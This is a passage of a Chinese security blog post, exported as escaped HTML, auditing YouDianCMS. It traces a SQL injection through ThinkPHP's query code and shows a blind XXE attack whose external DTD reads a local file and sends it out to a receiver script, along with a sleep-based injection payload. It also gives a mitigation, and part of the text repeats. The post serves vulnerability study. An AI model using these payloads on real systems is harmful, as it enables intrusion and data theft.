class=\"hljs-comment\">// 查询过后清空sql表达式组装 避免影响下次查询</span><br>      <span class=\"hljs-keyword\">$this</span>-&gt;options  =   <span class=\"hljs-keyword\">array</span>();<br>      <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>($options[<span class=\"hljs-string\">'table'</span>]))<br>          <span class=\"hljs-comment\">// 自动获取表名</span><br>          $options[<span class=\"hljs-string\">'table'</span>] =<span class=\"hljs-keyword\">$this</span>-&gt;getTableName();<br>      <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">empty</span>($options[<span class=\"hljs-string\">'alias'</span>])) &#123;<br>          $options[<span class=\"hljs-string\">'table'</span>]   .= <span class=\"hljs-string\">' '</span>.$options[<span class=\"hljs-string\">'alias'</span>];<br>      &#125;<br>      <span class=\"hljs-comment\">// 记录操作的模型名称</span><br>      $options[<span class=\"hljs-string\">'model'</span>] =  <span class=\"hljs-keyword\">$this</span>-&gt;name;<br>   <br>   ......<br>   <br>      <span class=\"hljs-comment\">// 表达式过滤</span><br>      <span class=\"hljs-keyword\">$this</span>-&gt;_options_filter($options);<br>      <span class=\"hljs-keyword\">return</span> $options;<br>  &#125;<br></code></pre></td></tr></table></figure>\n\n<p>解析传入参数，为拼接查询语句做准备，注意里面有一个 _options_filter() 跟进查看：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">protected</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_options_filter</span><span class=\"hljs-params\">(&amp;$options)</span> </span>&#123;&#125;<br></code></pre></td></tr></table></figure>\n\n<p>md 竟然是个空函数哈哈，我猜这可能是开发者为了之后爆出漏洞好修补直接首先写好的一个占位函数，至于具体怎么修，还得等待白帽子们怎么破了，有意思。</p>\n<ul>\n<li>返回到 getField() 方法中，查询的是一个字段，所以我们直接跳到 else 分支：</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">else</span>&#123;   <span class=\"hljs-comment\">// 查找一条记录</span><br>          $options[<span class=\"hljs-string\">'limit'</span>] = <span class=\"hljs-number\">1</span>;<br>          $result = <span class=\"hljs-keyword\">$this</span>-&gt;db-&gt;select($options);<br>          <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">empty</span>($result)) &#123;<br>              <span class=\"hljs-keyword\">return</span> reset($result[<span class=\"hljs-number\">0</span>]);<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure>\n\n<p>跟进到模型实例的数据库资源中进行查询：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// select 方法</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">select</span><span class=\"hljs-params\">($options=array<span class=\"hljs-params\">()</span>)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;model  =   $options[<span class=\"hljs-string\">'model'</span>];<br>        $sql   = <span class=\"hljs-keyword\">$this</span>-&gt;buildSelectSql($options);<br>        <span class=\"hljs-comment\">// 构造的 sql 语句为 select ‘InviterID’ FROM ‘youdian_member’ WHERE MemberID=2 and sleep(3);#limit1</span><br>        <br>        $cache  =  <span class=\"hljs-keyword\">isset</span>($options[<span class=\"hljs-string\">'cache'</span>])?$options[<span class=\"hljs-string\">'cache'</span>]:<span class=\"hljs-keyword\">false</span>;<br> ......<br>      <br>        $result   = <span class=\"hljs-keyword\">$this</span>-&gt;query($sql);<br></code></pre></td></tr></table></figure>\n\n<p>带入到数据库中进行查询，造成 sql 注入。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1\"></p>\n<p>整个过程不难，我主要想要总结的是这套系统运作后台数据库的方法和设计模式：</p>\n<p>由于用户使用的数据库扩展类型是未知的，所以代码需要根据不同情况选择不同的数据库连接:</p>\n<ul>\n<li>所有数据库对象的基类 <code>App/Core/Lib/Core/Db.class.php</code>,此系统支持 mysql 和 mysqli 两个扩展，根据选择情况来构建数据库对象，继承父类的一些声明和方法即可直接进行使用。</li>\n<li>工厂模式：工厂模式就是将创造对象的方法封装在一个文件的类函数里面，然后返回创建的对象，避免了 new 操作，而且当创建对象的方法或者参数改变的时候，我们可以直接修改工厂方法。</li>\n</ul>\n<p>这里的父类 Db.class.php 使用了工厂模式产生数据库对象，即 <strong>factory()</strong> 方法：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">factory</span><span class=\"hljs-params\">($db_config=<span class=\"hljs-string\">''</span>)</span> </span>&#123;<br>        <span class=\"hljs-comment\">// 读取数据库配置</span><br>        $db_config = <span class=\"hljs-keyword\">$this</span>-&gt;parseConfig($db_config);<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">empty</span>($db_config[<span class=\"hljs-string\">'dbms'</span>]))<br>            throw_exception(L(<span class=\"hljs-string\">'_NO_DB_CONFIG_'</span>));<br>        <span class=\"hljs-comment\">// 数据库类型</span><br>        <span class=\"hljs-keyword\">$this</span>-&gt;dbType = ucwords(strtolower($db_config[<span class=\"hljs-string\">'dbms'</span>]));<br>        $class = <span class=\"hljs-string\">'Db'</span>. <span class=\"hljs-keyword\">$this</span>-&gt;dbType;<br>        <span class=\"hljs-keyword\">if</span>(is_file(CORE_PATH.<span class=\"hljs-string\">'Driver/Db/'</span>.$class.<span class=\"hljs-string\">'.class.php'</span>)) &#123;<br>            <span class=\"hljs-comment\">// 内置驱动</span><br>            $path = CORE_PATH;<br>        &#125;<span class=\"hljs-keyword\">else</span>&#123; <span class=\"hljs-comment\">// 扩展驱动</span><br>            $path = EXTEND_PATH;<br>        &#125;<br>        <span class=\"hljs-comment\">// 检查驱动类</span><br>        <span class=\"hljs-keyword\">if</span>(require_cache($path.<span class=\"hljs-string\">'Driver/Db/'</span>.$class.<span class=\"hljs-string\">'.class.php'</span>)) &#123;<br>            $db = <span class=\"hljs-keyword\">new</span> $class($db_config);<br>            <span class=\"hljs-comment\">// 获取当前的数据库类型</span><br>            <span class=\"hljs-keyword\">if</span>( <span class=\"hljs-string\">'pdo'</span> != strtolower($db_config[<span class=\"hljs-string\">'dbms'</span>]) )<br>                $db-&gt;dbType = strtoupper(<span class=\"hljs-keyword\">$this</span>-&gt;dbType);<br>            <span class=\"hljs-keyword\">else</span><br>                $db-&gt;dbType = <span class=\"hljs-keyword\">$this</span>-&gt;_getDsnType($db_config[<span class=\"hljs-string\">'dsn'</span>]);<br>            <span class=\"hljs-keyword\">if</span>(APP_DEBUG)  $db-&gt;debug    = <span class=\"hljs-keyword\">true</span>;<br>        &#125;<span class=\"hljs-keyword\">else</span> &#123;<br>            <span class=\"hljs-comment\">// 类没有定义</span><br>            throw_exception(L(<span class=\"hljs-string\">'_NOT_SUPPORT_DB_'</span>).<span class=\"hljs-string\">': '</span> . $db_config[<span class=\"hljs-string\">'dbms'</span>]);<br>        &#125;<br>        <span class=\"hljs-keyword\">return</span> $db;<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>然后在构造函数 __construct() 中使用此方法创建数据库对象：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($config=<span class=\"hljs-string\">''</span>)</span></span>&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">$this</span>-&gt;factory($config);<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>php 有很多设计模式我们可以了解和学习，<a href=\"https://www.imooc.com/learn/236\" target=\"_blank\" rel=\"noopener\">这里</a>是慕课的一个不错的免费讲解设计模式的课程。</p>\n<p>ps: 同样的分析方法还能发现一个前台 xss 漏洞。</p>\n<h1 id=\"3-前台-xxe\"><a href=\"#3-前台-xxe\" class=\"headerlink\" title=\"3@ 前台 xxe\"></a>3@ 前台 xxe</h1><p>以前一直觉得 xxe 这种漏洞很少会在实战中出现，这也算是自己第一次实战审出 xxe ,由于利用条件比较苛刻，没有上报到 cnvd 等平台，在此做下简单分析 (为了保护厂家隐私，此文章已经上密码，仅做笔记和供朋友参阅，望大家注意自身安全)。</p>\n<p>文件位置：</p>\n<figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-regexp\">/App/</span>Lib<span class=\"hljs-regexp\">/Common/Y</span>dWx.<span class=\"hljs-keyword\">class</span>.php<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// 关键方法</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">responseMsg</span><span class=\"hljs-params\">()</span></span>&#123;<br>\t\t<span class=\"hljs-comment\">//$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"];\t//get post data, May be due to the different environments</span><br>        $postStr = file_get_contents(<span class=\"hljs-string\">\"php://input\"</span>);<br>\t\t<span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">empty</span>($postStr) ) <span class=\"hljs-keyword\">return</span>;<br>\t\t$HasCustomerService = $GLOBALS[<span class=\"hljs-string\">'Config'</span>][<span class=\"hljs-string\">'WX_CUSTOMER_SERVICE'</span>]; <span class=\"hljs-comment\">//是否启用多客服</span><br>\t\t<span class=\"hljs-comment\">//用户发送消息－&gt; 公众帐号</span><br>\t\t$postObj = simplexml_load_string($postStr, <span class=\"hljs-string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA);<br>\t\t......<br></code></pre></td></tr></table></figure>\n\n<p>可以看到，此方法将 post 流中的数据直接放入到 <code>simplexml_load_string()</code> 函数中，由于此方法未传入其他参数，所以只要有使用此方法的地方，必然会有 xxe 漏洞。</p>\n<p>由于本机未装 php 5.6 以下版本，所以本次测试环境为 :</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">os :</span> <span class=\"hljs-string\">win10</span><br><span class=\"hljs-attr\">php_version :</span> <span class=\"hljs-number\">5.4</span><span class=\"hljs-number\">.45</span><br></code></pre></td></tr></table></figure>\n\n<p>网上很多文章都有写 libxml 2.9.1 以上的 php 默认会禁止加载外部实体，实际上 libxml 2.9.4 这一版的 php 依旧可以成功加载外部实体。因为 php 7.0 以上的版本集成的 libxml 还是有 2.9.4 版，所以此漏洞也是可以在 php7 上复现的，这个问题由 Cart0a 提出。具体禁用加载外部实体的 libxml 版本有待探索。</p>\n<p>由于是无回显形式的 xxe，所以我们需要构造一个数据接收方：</p>\n<ul>\n<li>我们先在本地上传模拟测试实体 <code>test.dtd</code></li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-meta-keyword\">file</span> <span class=\"hljs-meta-keyword\">SYSTEM</span> <span class=\"hljs-meta-string\">\"php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini\"</span>&gt;</span><br><span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-meta-keyword\">int</span> <span class=\"hljs-meta-string\">\"&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/receive.php?p=%file;'&gt;\"</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>然后构造接收脚本 <code>receive.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br>file_put_contents(<span class=\"hljs-string\">\"result.txt\"</span>,$_GET[<span class=\"hljs-string\">'p'</span>]);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>最后将 payload 传入到 post 流中，偷取到的数据写入到 <code>result.txt</code> 文件中</li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-meta\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;</span><br><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-meta-keyword\">convert</span> [ <br><span class=\"hljs-meta\">&lt;!ENTITY % <span class=\"hljs-meta-keyword\">remote</span> <span class=\"hljs-meta-keyword\">SYSTEM</span> <span class=\"hljs-meta-string\">\"http://127.0.0.1/test.dtd\"</span>&gt;</span><br>%remote;%int;%send;<br>]&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2\"></p>\n<p>【由于图片需要上传需要打码，复现可根据上文文字步骤进行】</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./3.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3\"></p>\n<p>成功偷到数据。</p>\n<p>暂时的防御办法就是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">libxml_disable_entity_loader(<span class=\"hljs-keyword\">true</span>);<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"4-其他\"><a href=\"#4-其他\" class=\"headerlink\" title=\"4@ 其他\"></a>4@ 其他</h1><p>此系统还存在前后台的 csrf 漏洞，xss漏洞，有兴趣可自行审计。</p>\n<p>Refererece：</p>\n<p><code>https://www.cnvd.org.cn/flaw/show/CNVD-2019-21447</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h1><p>md 国庆睡的太爽了,睡爽了起来审一审 : p </p>\n<p>这次拿到的 youdiancms 是基于 tp 开发的一套简单的企业网站管理系统。cnvd 上收录关于其系统的漏洞只有星星点点的几个,故拿来复现练手,同时看看能不能再审出点自己的小洞~</p>\n<h1 id=\"2-CNVD-2019-21447-前台-sql-注入\"><a href=\"#2-CNVD-2019-21447-前台-sql-注入\" class=\"headerlink\" title=\"2@ CNVD-2019-21447 前台 sql 注入\"></a>2@ CNVD-2019-21447 前台 sql 注入</h1><p>条件:</p>\n<ul>\n<li>开启会员注册功能.</li>\n<li>用已经注册过得会员登录.</li>\n</ul>\n<p>由于基于 tp 开发,所以其路由规则就是类于 <code>/功能模块/类/方法/参数</code>  的 PATH_INFO 的模式.</p>\n<p>在运行过程中,会动态生成一个主文件 —&gt; <code>yunxingshi.php</code>,由于写入的时候并没有考虑到排版问题,所以为了便于审计,我们可以在<a href=\"http://tools.jb51.net/code/phpformat\" target=\"_blank\" rel=\"noopener\">这里</a>进行代码格式的美化.</p>\n<p>这里我们省去路由传入参数的过程,着重来学习下在框架开发的模式下,从数据库中存取数据的流程.为了方便调试演示,直接给出存在问题的方法:</p>\n<ul>\n<li><p>App/Lib/Action/Member/CustomerAction/ 下的 saveModify 的方法</p>\n</li>\n<li><p>演示 url  :  <code>http://cms.test1/index.php/Member/Customer/saveModify</code></p>\n<p><code>POST : MemberName=root1&amp;MemberID=1 and sleep(5);#</code></p>\n</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">saveModify</span><span class=\"hljs-params\">()</span></span>&#123;<br>\t\theader(<span class=\"hljs-string\">\"Content-Type:text/html; charset=utf-8\"</span>);<br>\t\t<span class=\"hljs-keyword\">$this</span>-&gt;_checkPost( $_POST );<br>\t\t<span class=\"hljs-keyword\">unset</span>( $_POST[<span class=\"hljs-string\">'InviterID'</span>], $_POST[<span class=\"hljs-string\">'IsEnable'</span>]);<br>\t\t$m = D(<span class=\"hljs-string\">'Admin/Member'</span>);<br>\t\t$inviterID = $m-&gt;where(<span class=\"hljs-string\">\"MemberID=&#123;$_POST['MemberID']&#125;\"</span>)-&gt;getField(<span class=\"hljs-string\">'InviterID'</span>);<br>......<br></code></pre></td></tr></table></figure>\n\n<p>可以看到,传入的 MemberID 参数,经过简单的处理,就直接带到了类的 where 方法里面进行查询了,如果包装类的方法再没有处理过程,那么很有可能产生注入,我们跟进观察.</p>\n<p>1、首先跟进到 _checkPost() 方法中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">private</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_checkPost</span><span class=\"hljs-params\">($p)</span></span>&#123;<br>\t\t<span class=\"hljs-keyword\">if</span>( <span class=\"hljs-keyword\">empty</span>($p[<span class=\"hljs-string\">'MemberName'</span>]) )&#123;<br>\t\t\t<span class=\"hljs-keyword\">$this</span>-&gt;ajaxReturn(<span class=\"hljs-keyword\">null</span>, <span class=\"hljs-string\">'昵称不能为空'</span> , <span class=\"hljs-number\">0</span>);<br>\t\t&#125;<br>\t\t<br>\t\t<span class=\"hljs-keyword\">if</span>( $_POST[<span class=\"hljs-string\">'MemberPassword'</span>] != <span class=\"hljs-string\">''</span>)&#123;<br>\t\t\t$_POST[<span class=\"hljs-string\">'MemberPassword'</span>] = md5($_POST[<span class=\"hljs-string\">'MemberPassword'</span>]);<br>\t\t&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>\t\t\t<span class=\"hljs-keyword\">unset</span>( $_POST[<span class=\"hljs-string\">'MemberPassword'</span>] );<br>\t\t&#125;<br>\t&#125;<br></code></pre></td></tr></table></figure>\n\n<p>没有进行传 入参数的过滤,只是提醒我们必须传入 MemberName 这个参数,否则返回错误提示信息.</p>\n<p>2、接着 D() 方法大致流程就是新建一个模型类实例，然后返回</p>\n<p>3、然后就到了关键的带入到实例中 where 方法中，我们来着重看看整个数据的流动过程：</p>\n<ul>\n<li>没有 where 方法，首先调用到 __call() 这个魔术方法，来判断需要进行的操作。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__call</span><span class=\"hljs-params\">($method,$args)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(in_array(strtolower($method),<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">'table'</span>,<span class=\"hljs-string\">'where'</span>,<span class=\"hljs-string\">'order'</span>,<span class=\"hljs-string\">'limit'</span>,<span class=\"hljs-string\">'page'</span>,<span class=\"hljs-string\">'alias'</span>,<span class=\"hljs-string\">'having'</span>,<span class=\"hljs-string\">'group'</span>,<span class=\"hljs-string\">'lock'</span>,<span class=\"hljs-string\">'distinct'</span>),<span class=\"hljs-keyword\">true</span>)) &#123;<br>            <span class=\"hljs-comment\">// 连贯操作的实现</span><br>            <span class=\"hljs-keyword\">$this</span>-&gt;options[strtolower($method)] =   $args[<span class=\"hljs-number\">0</span>];  <span class=\"hljs-comment\">// $method=where ; $args[0]= ‘MemberID=1 and sleep(3);#’</span><br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">$this</span>;<br>            ......<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>返回 this 接着上面的链式调用，访问 getField() 方法，其中有一个 _parseOptions() 的方法，跟进查看：</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">protected</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_parseOptions</span><span class=\"hljs-params\">($options=array<span class=\"hljs-params\">()</span>)</span> </span>&#123;<br>      <span class=\"hljs-keyword\">if</span>(is_array($options))<br>          $options =  array_merge(<span class=\"hljs-keyword\">$this</span>-&gt;options,$options);<br>      <span class=\"hljs-comment\">// 查询过后清空sql表达式组装 避免影响下次查询</span><br>      <span class=\"hljs-keyword\">$this</span>-&gt;options  =   <span class=\"hljs-keyword\">array</span>();<br>      <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>($options[<span class=\"hljs-string\">'table'</span>]))<br>          <span class=\"hljs-comment\">// 自动获取表名</span><br>          $options[<span class=\"hljs-string\">'table'</span>] =<span class=\"hljs-keyword\">$this</span>-&gt;getTableName();<br>      <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">empty</span>($options[<span class=\"hljs-string\">'alias'</span>])) &#123;<br>          $options[<span class=\"hljs-string\">'table'</span>]   .= <span class=\"hljs-string\">' '</span>.$options[<span class=\"hljs-string\">'alias'</span>];<br>      &#125;<br>      <span class=\"hljs-comment\">// 记录操作的模型名称</span><br>      $options[<span class=\"hljs-string\">'model'</span>] =  <span class=\"hljs-keyword\">$this</span>-&gt;name;<br>   <br>   ......<br>   <br>      <span class=\"hljs-comment\">// 表达式过滤</span><br>      <span class=\"hljs-keyword\">$this</span>-&gt;_options_filter($options);<br>      <span class=\"hljs-keyword\">return</span> $options;<br>  &#125;<br></code></pre></td></tr></table></figure>\n\n<p>解析传入参数，为拼接查询语句做准备，注意里面有一个 _options_filter() 跟进查看：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">protected</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">_options_filter</span><span class=\"hljs-params\">(&amp;$options)</span> </span>&#123;&#125;<br></code></pre></td></tr></table></figure>\n\n<p>md 竟然是个空函数哈哈，我猜这可能是开发者为了之后爆出漏洞好修补直接首先写好的一个占位函数，至于具体怎么修，还得等待白帽子们怎么破了，有意思。</p>\n<ul>\n<li>返回到 getField() 方法中，查询的是一个字段，所以我们直接跳到 else 分支：</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">else</span>&#123;   <span class=\"hljs-comment\">// 查找一条记录</span><br>          $options[<span class=\"hljs-string\">'limit'</span>] = <span class=\"hljs-number\">1</span>;<br>          $result = <span class=\"hljs-keyword\">$this</span>-&gt;db-&gt;select($options);<br>          <span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">empty</span>($result)) &#123;<br>              <span class=\"hljs-keyword\">return</span> reset($result[<span class=\"hljs-number\">0</span>]);<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure>\n\n<p>跟进到模型实例的数据库资源中进行查询：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-comment\">// select 方法</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">select</span><span class=\"hljs-params\">($options=array<span class=\"hljs-params\">()</span>)</span> </span>&#123;<br>        <span class=\"hljs-keyword\">$this</span>-&gt;model  =   $options[<span class=\"hljs-string\">'model'</span>];<br>        $sql   = <span class=\"hljs-keyword\">$this</span>-&gt;buildSelectSql($options);<br>        <span class=\"hljs-comment\">// 构造的 sql 语句为 select ‘InviterID’ FROM ‘youdian_member’ WHERE MemberID=2 and sleep(3);#limit1</span><br>        <br>        $cache  =  <span class=\"hljs-keyword\">isset</span>($options[<span class=\"hljs-string\">'cache'</span>])?$options[<span class=\"hljs-string\">'cache'</span>]:<span class=\"hljs-keyword\">false</span>;<br> ......<br>      <br>        $result   = <span class=\"hljs-keyword\">$this</span>-&gt;query($sql);<br></code></pre></td></tr></table></figure>\n\n<p>带入到数据库中进行查询，造成 sql 注入。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" 